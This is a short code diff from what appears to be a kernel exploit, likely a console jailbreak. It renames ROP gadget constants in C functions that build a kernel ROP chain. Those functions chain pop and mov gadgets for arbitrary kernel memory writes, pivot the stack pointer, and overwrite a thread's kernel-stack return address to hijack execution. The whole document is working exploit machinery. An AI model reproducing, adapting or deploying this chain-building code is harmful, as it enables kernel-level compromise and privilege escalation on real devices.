@@ -168,11 +168,11 @@ void krop_push(struct krop_manage *krop, uint64_t val)
 
 void krop_push_write8(struct krop_manage *krop, uint64_t dest, uint64_t val)
 {
-    krop_push(krop, KROP_GADGET_200_POP_RDI);
+    krop_push(krop, KROP_GADGET_POP_RDI);
     krop_push(krop, dest);
-    krop_push(krop, KROP_GADGET_200_POP_RSI);
+    krop_push(krop, KROP_GADGET_POP_RSI);
     krop_push(krop, val);
-    krop_push(krop, KROP_GADGET_200_MOV_QWORD_PTR_RDI_RSI);
+    krop_push(krop, KROP_GADGET_MOV_QWORD_PTR_RDI_RSI);
 }
 
 void krop_push_exit(struct krop_manage *krop)
@@ -190,18 +190,18 @@ void krop_push_exit(struct krop_manage *krop)
     );
 
     // Restore r12
-    // krop_push(krop, KROP_GADGET_200_POP_R12);
+    // krop_push(krop, KROP_GADGET_POP_R12);
     // krop_push(krop, 1337);
 
     // Reset stack pointer
-    krop_push(krop, KROP_GADGET_200_POP_RSP);
+    krop_push(krop, KROP_GADGET_POP_RSP);
     krop_push(krop, krop->thread_kstack + krop->kstack_ret_addr_offset);
 }
 
 void krop_push_infloop(struct krop_manage *krop)
 {
     SOCK_LOG("krop_push_infloop: WE ARE HANGING THE KROP THREAD, WARNING\n");
-    krop_push(krop, KROP_GADGET_200_INFLOOP);
+    krop_push(krop, KROP_GADGET_INFLOOP);
 }
 
 void krop_copy_kernel(struct krop_manage *krop)
@@ -224,7 +224,7 @@ void krop_run(struct krop_manage *krop)
     fake_rsp = krop->thread_kstack + krop->kstack_fake_stack_offset;
     kernel_copyin(&fake_rsp, krop->thread_kstack + krop->kstack_ret_addr_offset + 0x8, sizeof(fake_rsp));
 
-    fake_ret = KROP_GADGET_200_POP_RSP;
+    fake_ret = KROP_GADGET_POP_RSP;
     kernel_copyin(&fake_ret, krop->thread_kstack + krop->kstack_ret_addr_offset, sizeof(fake_ret));
 
     // Unblock the worker thread by writing expected size to pipe
